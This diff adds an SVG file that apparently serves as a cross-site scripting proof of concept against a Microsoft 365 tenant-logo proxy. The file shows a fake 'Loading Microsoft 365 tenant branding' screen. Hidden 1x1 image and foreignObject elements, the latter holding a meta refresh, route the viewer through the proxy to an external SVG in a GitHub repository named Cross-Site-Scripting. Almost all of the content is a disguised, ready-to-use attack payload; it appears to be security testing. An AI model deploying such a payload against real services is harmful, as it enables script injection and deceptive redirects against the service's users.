@@ -1,0 +1,42 @@
+<svg xmlns="http://www.w3.org/2000/svg"
+     xmlns:html="http://www.w3.org/1999/xhtml"
+     viewBox="0 0 800 300">
+
+  <image
+    href="https://m365.cloud.microsoft/resources/tenant-logo-proxy?url=https%3A%2F%2Fraw.githubusercontent.com%2Fa-n-e-e-s%2FCross-Site-Scripting%2Frefs%2Fheads%2Fmain%2Falert.svg%3Foneclick%3Dstage1-v1"
+    x="0"
+    y="0"
+    width="1"
+    height="1"/>
+
+  <rect width="800" height="300" fill="#0f6cbd"/>
+
+  <text
+    x="400"
+    y="125"
+    font-size="28"
+    fill="white"
+    text-anchor="middle">
+    Loading Microsoft 365 tenant branding…
+  </text>
+
+  <text
+    x="400"
+    y="175"
+    font-size="18"
+    fill="white"
+    text-anchor="middle">
+    One-link cache-context security test
+  </text>
+
+  <foreignObject x="0" y="0" width="1" height="1">
+    <html:html>
+      <html:head>
+        <html:meta
+          http-equiv="refresh"
+          content="2;url=https://m365.cloud.microsoft/resources/tenant-logo-proxy?url=https%3A%2F%2Fraw.githubusercontent.com%2Fa-n-e-e-s%2FCross-Site-Scripting%2Frefs%2Fheads%2Fmain%2Falert.svg%3Foneclick%3Dstage1-v1"/>
+      </html:head>
+      <html:body></html:body>
+    </html:html>
+  </foreignObject>
+</svg>
